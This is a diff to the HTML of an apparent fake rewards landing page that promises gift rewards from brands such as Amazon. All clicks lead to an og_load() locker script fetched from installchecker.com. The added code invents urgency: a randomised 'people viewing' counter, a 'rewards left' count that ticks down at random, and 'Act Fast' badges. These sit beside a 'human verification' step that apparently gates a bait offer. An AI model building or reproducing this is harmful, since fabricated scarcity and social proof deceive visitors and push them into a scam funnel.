@@ -17,6 +17,7 @@
             --gray: #E5E7EB;
             --success: #10B981;
             --warning: #F59E0B;
+            --danger: #EF4444;
         }
         
         * {
@@ -312,6 +313,10 @@
         .badge-warning .badge-icon {
             color: var(--warning);
         }
+
+        .badge-danger .badge-icon {
+            color: var(--danger);
+        }
         
         footer {
             text-align: center;
@@ -321,90 +326,73 @@
             background-color: rgba(0,0,0,0.02);
             margin-top: 60px;
         }
-        .countdown-timer {
-            text-align: center;
-            margin: 30px 0;
-        }
-        
-        .timer-box {
-            background: linear-gradient(135deg, #6C4DF6, #8A6DF7);
+
+        /* New Hurry Up Section */
+        .urgency-container {
+            background: linear-gradient(135deg, #FF416C, #FF4B2B);
             color: white;
-            display: inline-flex;
-            align-items: center;
-            padding: 12px 25px;
-            border-radius: 12px;
-            font-size: 28px;
+            padding: 30px;
+            border-radius: 16px;
+            margin: 40px auto;
+            max-width: 800px;
+            text-align: center;
+            box-shadow: 0 15px 30px rgba(255, 75, 43, 0.3);
+            position: relative;
+            overflow: hidden;
+            animation: pulseBackground 2s infinite alternate;
+        }
+
+        @keyframes pulseBackground {
+            0% { box-shadow: 0 15px 30px rgba(255, 75, 43, 0.3); }
+            100% { box-shadow: 0 15px 40px rgba(255, 75, 43, 0.5); }
+        }
+
+        .urgency-title {
+            font-size: 32px;
             font-weight: 700;
-            box-shadow: 0 10px 20px rgba(108, 77, 246, 0.2);
-        }
-        
-        .timer-colon {
-            margin: 0 5px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .timer-text {
-            color: #64748B;
-            margin-top: 10px;
-            font-size: 16px;
-            font-weight: 500;
-        }
-        
-        .footer-links {
+            margin-bottom: 15px;
             display: flex;
+            align-items: center;
             justify-content: center;
-            gap: 30px;
-            margin-bottom: 30px;
+            gap: 15px;
+        }
+
+        .urgency-title i {
+            animation: bounce 0.8s infinite alternate;
+        }
+
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-5px); }
+        }
+
+        .urgency-message {
+            font-size: 18px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .user-count {
+            display: inline-block;
+            background-color: rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            animation: scalePulse 2s infinite;
+        }
+
+        @keyframes scalePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .remaining-text {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-top: 15px;
         }
         
-        .footer-links a {
-            color: #64748B;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-        
-        .footer-links a:hover {
-            color: var(--primary);
-        }
-        
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 32px;
-            }
-            
-            .subheadline {
-                font-size: 18px;
-            }
-            
-            .steps {
-                flex-direction: column;
-            }
-            
-            .step {
-                min-width: 100%;
-            }
-            
-            .brands-container {
-                height: 80px;
-            }
-            
-            .brand-icon {
-                height: 35px;
-            }
-            
-            .brand-link {
-                margin: 0 15px;
-            }
-            
-            .how-it-works {
-                padding: 60px 20px;
-            }
-        }
         .many-more {
             text-align: center;
             margin-top: 20px;
@@ -439,6 +427,46 @@
             0%, 100% { transform: translateY(0); opacity: 0.6; }
             50% { transform: translateY(-3px); opacity: 1; }
         }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 32px;
+            }
+            
+            .subheadline {
+                font-size: 18px;
+            }
+            
+            .steps {
+                flex-direction: column;
+            }
+            
+            .step {
+                min-width: 100%;
+            }
+            
+            .brands-container {
+                height: 80px;
+            }
+            
+            .brand-icon {
+                height: 35px;
+            }
+            
+            .brand-link {
+                margin: 0 15px;
+            }
+            
+            .how-it-works {
+                padding: 60px 20px;
+            }
+
+            .urgency-title {
+                font-size: 26px;
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
     </style>
 <script type="text/javascript">var ogblock=true;</script>
 <script type="text/javascript" id="ogjs" src="https://installchecker.com/cl/js/vonjo9"></script>
@@ -453,22 +481,29 @@
             </div>
         </div>
     </header>
-    <div class="countdown-timer">
-        <div class="timer-box">
-            <span id="hours">01</span>
-            <span class="timer-colon">:</span>
-            <span id="minutes">20</span>
-            <span class="timer-colon">:</span>
-            <span id="seconds">00</span>
-        </div>
-        <p class="timer-text">Limited time remaining to claim your reward</p>
-    </div>
     
     <section class="hero">
         <div class="container">
             <h1>Exclusive Rewards From World's Top Brands</h1>
             <p class="subheadline">Get verified access to premium digital rewards from global partners. Simple process with instant delivery.</p>
-            <button class="cta-button" id="mainCTA" onclick="og_load()">Unlock My Reward</button>
+            
+            <!-- New Hurry Up Section -->
+            <div class="urgency-container">
+                <h2 class="urgency-title">
+                    <i class="fas fa-bolt"></i> Hurry Up! Limited Rewards Available
+                </h2>
+                <p class="urgency-message">
+                    Only a few rewards remaining in stock! Claim yours now before they're all gone.
+                </p>
+                <div class="user-count">
+                    <i class="fas fa-users"></i> 23 people are viewing this right now
+                </div>
+                <button class="cta-button" id="mainCTA" onclick="og_load()">Claim My Reward Now</button>
+                <p class="remaining-text">
+                    <i class="fas fa-exclamation-triangle"></i> Only 7 rewards left at this price!
+                </p>
+            </div>
+
             <div class="brands-container">
                 <div class="brands-scroll">
                     <a class="brand-link" title="Amazon" onclick="og_load()">
@@ -536,7 +571,7 @@
                 </div>
             </div>
             <div class="many-more">
-                <span>and You can choose more than these waiting for Verification</span>
+                <span>and many more premium brands available after verification</span>
                 <div class="dots">
                     <span class="dot"></span>
                     <span class="dot"></span>
@@ -548,9 +583,11 @@
                 <div class="badge badge-warning">
                     <span class="badge-icon"><i class="fas fa-clock"></i></span> Limited Time Availability
                 </div>
+                <div class="badge badge-danger">
+                    <span class="badge-icon"><i class="fas fa-exclamation-circle"></i></span> High Demand - Act Fast!
+                </div>
             </div>
         </div>
-        <button class="cta-button" id="mainCTA" onclick="og_load()">Unlock My Reward</button>
     </section>
     
     <section class="how-it-works">
@@ -560,20 +597,20 @@
             <div class="steps">
                 <div class="step">
                     <div class="step-number">1</div>
-                    <h3 class="step-title">Select Your Brand</h3>
-                    <p class="step-description">Choose from our premium partners to access your exclusive reward.</p>
+                    <h3 class="step-title">Choose Your Reward</h3>
+                    <p class="step-description">Select from our exclusive offers tailored for verified users.</p>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">2</div>
-                    <h3 class="step-title">Complete Verification</h3>
-                    <p class="step-description">Quick identity confirmation to ensure secure reward distribution.</p>
+                    <h3 class="step-title">Complete Human Verification</h3>
+                    <p class="step-description">Quick identity check to ensure you're real (prevents bots and fraud).</p>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">3</div>
-                    <h3 class="step-title">Receive Instantly</h3>
-                    <p class="step-description">Get your digital reward delivered directly to your email.</p>
+                    <h3 class="step-title">Instant Reward Delivery</h3>
+                    <p class="step-description">Receive your digital reward immediately after successful verification.</p>
                 </div>
             </div>
         </div>
@@ -600,66 +637,33 @@
         brandsScroll.addEventListener('mouseleave', () => {
             brandsScroll.style.animationPlayState = 'running';
         });
+
+        // Dynamic user count animation
+        let userCount = 23;
+        const userCountElement = document.querySelector('.user-count');
         
-        // Improved Timer Logic
-        function initializeTimer() {
-            // Check if page was refreshed
-            const isPageRefreshed = performance.navigation.type === 1;
-            
-            // Set initial time (1 hour 20 minutes in seconds)
-            const initialTime = 80 * 60;
-            
-            // Get stored timer data
-            let storedEndTime = localStorage.getItem('timerEndTime');
-            let storedRemaining = localStorage.getItem('timerRemaining');
-            
-            if (isPageRefreshed || !storedEndTime || !storedRemaining) {
-                // Reset timer if page was refreshed or no stored data
-                const now = new Date();
-                const endTime = new Date(now.getTime() + initialTime * 1000);
-                localStorage.setItem('timerEndTime', endTime);
-                localStorage.setItem('timerRemaining', initialTime);
-                storedEndTime = endTime;
-                storedRemaining = initialTime;
+        setInterval(() => {
+            // Random fluctuation between -2 and +3
+            const change = Math.floor(Math.random() * 6) - 2;
+            userCount = Math.max(15, userCount + change);
+            userCountElement.innerHTML = `<i class="fas fa-users"></i> ${userCount} people are viewing this right now`;
+        }, 3000);
+
+        // Random remaining rewards counter
+        let remainingRewards = 7;
+        const remainingText = document.querySelector('.remaining-text');
+        
+        setInterval(() => {
+            if (remainingRewards > 0 && Math.random() > 0.7) {
+                remainingRewards--;
+                remainingText.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Only ${remainingRewards} rewards left at this price!`;
+                
+                if (remainingRewards <= 3) {
+                    remainingText.style.color = '#FF6B6B';
+                    remainingText.innerHTML += ' <i class="fas fa-fire"></i>';
+                }
             }
-            
-            return {
-                endTime: new Date(storedEndTime),
-                remaining: parseInt(storedRemaining)
-            };
-        }
-        
-        function updateTimerDisplay() {
-            const timerData = initializeTimer();
-            const now = new Date();
-            const diff = timerData.endTime - now;
-            
-            if (diff <= 0) {
-                // Timer has expired
-                document.getElementById('hours').textContent = '00';
-                document.getElementById('minutes').textContent = '00';
-                document.getElementById('seconds').textContent = '00';
-                clearInterval(timerInterval);
-                return;
-            }
-            
-            // Calculate remaining time
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-            
-            // Update display
-            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
-            
-            // Store remaining time
-            localStorage.setItem('timerRemaining', Math.floor(diff / 1000));
-        }
-        
-        // Update timer immediately and then every second
-        updateTimerDisplay();
-        const timerInterval = setInterval(updateTimerDisplay, 1000);
+        }, 5000);
     </script>
 </body>
 </html>
